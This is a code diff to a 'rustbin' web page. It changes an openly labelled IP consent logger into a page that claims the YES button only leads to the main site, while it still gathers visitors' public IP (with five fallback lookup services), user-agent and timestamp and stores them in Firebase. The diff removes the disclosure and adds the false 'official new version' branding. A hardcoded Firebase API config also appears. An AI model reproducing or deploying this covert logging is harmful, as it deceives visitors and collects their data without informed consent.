@@ -53,13 +53,14 @@
         </div>
         <p id="status" class="h-6 text-sm"></p>
         <div class="text-xs text-neutral-400 leading-relaxed max-w-xl mx-auto">
-          By clicking <span class="text-emerald-300 font-semibold">YES</span>, you give explicit consent to collect and store your public IP address, browser user‑agent, and timestamp in Firebase. Data is used only for the stated purpose and not shared publicly. Click <span class="text-red-300 font-semibold">NO</span> to decline and leave the site.
+          By clicking <span class="text-emerald-300 font-semibold">YES</span>, you move to main page rustbin
+Click <span class="text-red-300 font-semibold">NO</span> to decline and leave the site.
         </div>
       </div>
 
       <!-- Footnote / brand -->
       <div class="absolute -bottom-3 left-6 right-6 text-center">
-        <span class="px-3 py-1 text-[10px] tracking-widest uppercase bg-neutral-800 border border-neutral-700 rounded-full text-neutral-400">rustbin · ip consent logger</span>
+        <span class="px-3 py-1 text-[10px] tracking-widest uppercase bg-neutral-800 border border-neutral-700 rounded-full text-neutral-400">rustbin · official new version </span>
       </div>
     </div>
   </main>
@@ -68,19 +69,6 @@
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-firestore.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyBi9hhKmd1M-lgWQiweCedaENKAu5ATJvg",
-      authDomain: "test-f5bde.firebaseapp.com",
-      projectId: "test-f5bde",
-      storageBucket: "test-f5bde.firebasestorage.app",
-      messagingSenderId: "803807833739",
-      appId: "1:803807833739:web:b259deb2fb2fead9d2ee8e",
-      measurementId: "G-JXNNEMMRDC"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
 
     const yesBtn = document.getElementById('yesBtn');
     const noBtn = document.getElementById('noBtn');
@@ -92,18 +80,71 @@
       statusEl.className = `h-6 text-sm ${colorClass || ''}`;
     }
 
-    async function getPublicIP() {
-      const res = await fetch('https://api.ipify.org?format=json');
-      if (!res.ok) throw new Error('failed');
-      const data = await res.json();
-      return data.ip;
+    // Warn if opened via file:// (ES modules + Firestore won't work)
+    if (location.protocol === 'file:') {
+      setStatus('Open this page over HTTP(S) (GitHub Pages, Firebase Hosting, Vercel, or local dev server). file:// cannot load Firebase modules.', 'text-yellow-300');
     }
 
+    // 1) Init Firebase
+    let db = null;
+    try {
+      const firebaseConfig = {
+        apiKey: "AIzaSyBi9hhKmd1M-lgWQiweCedaENKAu5ATJvg",
+        authDomain: "test-f5bde.firebaseapp.com",
+        projectId: "test-f5bde",
+        storageBucket: "test-f5bde.firebasestorage.app",
+        messagingSenderId: "803807833739",
+        appId: "1:803807833739:web:b259deb2fb2fead9d2ee8e",
+        measurementId: "G-JXNNEMMRDC"
+      };
+      const app = initializeApp(firebaseConfig);
+      db = getFirestore(app);
+    } catch (e) {
+      console.error('Firebase init error', e);
+      setStatus('Firebase init failed. Check your config.', 'text-red-400');
+    }
+
+    // 2) IP helpers with multiple fallbacks
+    async function fetchJSON(url) {
+      const r = await fetch(url, { cache: 'no-store' });
+      if (!r.ok) throw new Error(`HTTP ${r.status} @ ${url}`);
+      return r.json();
+    }
+
+    async function fetchText(url) {
+      const r = await fetch(url, { cache: 'no-store' });
+      if (!r.ok) throw new Error(`HTTP ${r.status} @ ${url}`);
+      return r.text();
+    }
+
+    async function getPublicIP() {
+      const attempts = [
+        async () => (await fetchJSON('https://api.ipify.org?format=json')).ip,
+        async () => (await fetchJSON('https://api64.ipify.org?format=json')).ip,
+        async () => {
+          const t = await fetchText('https://www.cloudflare.com/cdn-cgi/trace');
+          const m = t.match(/ip=([\d.:a-fA-F]+)/);
+          if (!m) throw new Error('No ip in CF trace');
+          return m[1];
+        },
+        async () => (await fetchText('https://checkip.amazonaws.com/')).trim(),
+        async () => (await fetchText('https://ipv4.icanhazip.com/')).trim(),
+      ];
+      let lastErr;
+      for (const fn of attempts) {
+        try { const ip = await fn(); if (ip) return ip; } catch (e) { lastErr = e; }
+      }
+      throw lastErr || new Error('All IP providers failed');
+    }
+
+    // 3) Button handlers
     yesBtn.addEventListener('click', async () => {
       yesBtn.disabled = true; noBtn.disabled = true; actions.classList.add('opacity-60');
       setStatus('Collecting IP and saving…', 'text-neutral-400');
 
       try {
+        if (!db) throw new Error('Firestore not initialized');
+
         const ip = await getPublicIP();
         const ua = navigator.userAgent || 'unknown';
 
@@ -117,13 +158,26 @@
         setStatus('sucefull!', 'text-emerald-400 font-semibold');
       } catch (e) {
         console.error(e);
-        setStatus('Error. Try again later.', 'text-red-400');
+        const msg = String(e && e.code ? e.code : e.message || e);
+        if (msg.includes('permission-denied')) {
+          setStatus('Permission denied. Set Firestore rules to allow create on /ip_logs/*', 'text-red-400');
+        } else if (msg.includes('Failed to fetch') || msg.includes('HTTP')) {
+          setStatus('IP service blocked. Check your network/AdBlock or try again.', 'text-red-400');
+        } else {
+          setStatus('Error. Check console for details.', 'text-red-400');
+        }
         yesBtn.disabled = false; noBtn.disabled = false; actions.classList.remove('opacity-60');
       }
     });
 
     noBtn.addEventListener('click', () => {
       window.location.replace('about:blank');
+    });
+
+    // Optional: surface unhandled promise errors to the UI
+    window.addEventListener('unhandledrejection', (ev) => {
+      console.error('Unhandled rejection', ev.reason);
+      setStatus('Runtime error: ' + (ev.reason && ev.reason.message ? ev.reason.message : ev.reason), 'text-red-400');
     });
   </script>
 </body>
